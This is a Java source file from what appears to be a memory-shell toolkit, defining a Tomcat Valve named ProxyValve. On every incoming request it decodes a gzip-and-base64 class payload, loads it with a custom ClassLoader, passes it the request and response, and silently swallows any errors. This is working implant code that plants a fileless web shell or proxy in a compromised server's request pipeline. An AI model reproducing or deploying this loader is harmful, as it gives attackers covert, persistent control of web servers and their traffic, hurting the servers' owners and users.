package com.reajason.javaweb.memshell.shelltool.proxy;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

public class ProxyValve extends ClassLoader implements Valve {
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;
    protected Valve next;
    protected boolean asyncSupported;

    public ProxyValve() {
    }

    protected ProxyValve(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (getProxyHttpClass().newInstance().equals(new Object[]{request, response})) {
                return;
            }
        } catch (Throwable ignored) {
        }
        getNext().invoke(request, response);
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyValve.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = new ProxyValve(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        return proxyHttpClass;
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }

    @Override
    public Valve getNext() {
        return next;
    }

    @Override
    public void setNext(Valve valve) {
        next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }
}
